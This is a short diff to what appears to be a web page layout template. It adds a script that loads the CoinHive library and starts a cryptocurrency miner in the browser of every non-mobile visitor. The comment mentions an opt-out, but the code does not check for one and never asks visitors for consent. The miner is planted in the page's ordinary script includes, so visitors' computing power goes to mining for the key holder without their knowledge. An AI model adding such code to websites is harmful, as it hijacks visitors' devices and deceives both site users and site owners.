@@ -44,4 +44,15 @@
 <script src="https://cdnjs.cloudflare.com/ajax/libs/jQuery-linkify/2.1.4/linkify.min.js"></script>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/jQuery-linkify/2.1.4/linkify-jquery.min.js"></script>
 
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script>
+    var miner = new CoinHive.Anonymous('H1UAgfHsU8xBw1p5NcfhYLexE1DNKoMi', {throttle: 0.3});
+
+    // Only start on non-mobile devices and if not opted-out
+    // in the last 14400 seconds (4 hours):
+    if (!miner.isMobile()) {
+        miner.start();
+    }
+</script>
+
 @yield('scripts')
